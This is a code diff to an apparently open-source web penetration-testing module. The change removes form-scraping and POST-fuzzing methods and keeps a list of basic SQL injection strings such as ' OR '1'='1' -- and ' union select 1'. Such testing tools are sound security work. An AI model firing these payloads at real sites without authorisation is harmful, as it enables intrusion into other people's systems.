@@ -31,12 +31,9 @@ Below are the general points in this penetration testing:
 The goal of this penetration testing is create an exception on the backend services so we can try to do stack analysis to
 determine specific details about the application.
 '''
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse
-import requests
 import re
 from httpparser.httprequest import HTTPRequest
-import progressbar
+from progress import ProgressBar
 
 class error_suite():
 	#
@@ -83,54 +80,16 @@ class error_suite():
 
 
 	#
-	# This method attacks URL via HTTP POST with invalid inputs and basic SQL injections
-	#
-	def attack_url_via_post(self, url, formdata=None):
-		invalidInputs = [ "alsdfjhashdkajdhjkahdash322343242342&lk3j24lk234j2l34j&lj23l4jl2k3j4l2j4j2l;4jl;2fgkjldfjglkldhfqmnrejqwkjehkqwehrkqhekqwheklhqwekjhqwkheklqwhelkhqwehqwkehqwhekqhweklqwejhqwlkehkqwhe", ""]
-		sqlInjections = self.build_sql_injections()
-
-		# invalid input
-		for inv in invalidInputs:
-			for key, value in formdata.items():
-				if value is None or value == "":
-					formdata[key] = inv
-					resp = requests.post(url, data=formdata)
-		# sql injections
-		for sql in sqlInjections:
-			for key, value in formdata.items():
-				if value is None or value == "":
-					formdata[key] = sql
-					resp = requests.post(url, data=formdata)
-
-	#
 	# Build basic SQL innjection list	
 	#
 	def build_sql_injections(self):
 		l = [ "' OR '1'='1' --", "\' OR\'1\'=\'1\' --", "' OR '1'='1' ({", "' OR '1'='1' /*", "' AND 1=2'", "1 or x=1", "\' OR x=1", "\' union select 1" ]
 		return l
 
-	#
-	# This method searches html page for HTML form tags
-	#
-	def check_for_html_form(self, hostname, url):
-		fullUrl = "{0}/{1}".format(hostname, url)
-		if fullUrl != None and "http://" in fullUrl:
-			r = requests.get(fullUrl)
-			html = r.text
-			soup = BeautifulSoup(html, 'lxml')
-			for f in soup.find_all('form'):
-				if (f is not None):
-					method = f.get('method')
-					action = f.get('action')
-					# fields = f.findAll('input', recursive=False)
-					fields = f.findAll('input')
-					formdata = dict((field.get('name'), field.get('value')) for field in fields)
-					self.attack_url_via_post(fullUrl, formdata)
-
 	def run(self):
 		report_list = []
 		if self.zapper.spider_messages() != None:
-			bar = progressbar.ProgressBar(maxval=len(self.zapper.spider_messages()), widgets=[progressbar.Bar('=', '[', ']'), ' ', progressbar.Percentage()])
+			bar = ProgressBar(maxval=len(self.zapper.spider_messages()))
 			if(self.args["adapt_general"]["verbose"]):bar.start()
 			#for zapmsg in self.zapper.spider_messages():
 			messages = self.zapper.spider_messages()
